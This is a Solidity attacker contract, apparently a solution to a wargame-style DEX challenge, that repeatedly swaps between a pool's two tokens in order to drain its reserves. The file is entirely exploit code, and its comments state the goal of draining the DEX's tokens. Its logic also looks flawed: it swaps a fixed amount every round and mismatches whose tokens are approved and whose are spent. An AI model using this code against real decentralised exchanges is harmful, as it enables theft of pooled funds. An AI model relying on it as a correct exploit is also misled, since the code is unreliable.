pragma solidity ^0.8.0;

interface ISwappableToken {
    function approve(address owner, address spender, uint256 amount) external returns (bool);
}
interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

contract DexAttacker {
    IDex private immutable _victim;
    uint256 private constant AMOUNT = 1000000;

    constructor(address victimAddress) {
        _victim = IDex(victimAddress);
    }

    function drainTokens() external {
        address[] memory tokens = new address[](2);
        tokens[0] = _victim.token1();
        tokens[1] = _victim.token2();

        // Approve DEX to spend player's tokens
        for (uint256 i = 0; i < 2; i++) {
            ISwappableToken(tokens[i]).approve(msg.sender, address(_victim), AMOUNT);
        }

        for (uint256 i = 0; i < 10; i++) {
            // Swap between tokens in a way that drains DEX's tokens
            _victim.swap(tokens[0], tokens[1], AMOUNT);
            (tokens[0], tokens[1]) = (tokens[1], tokens[0]);
        }
    }
}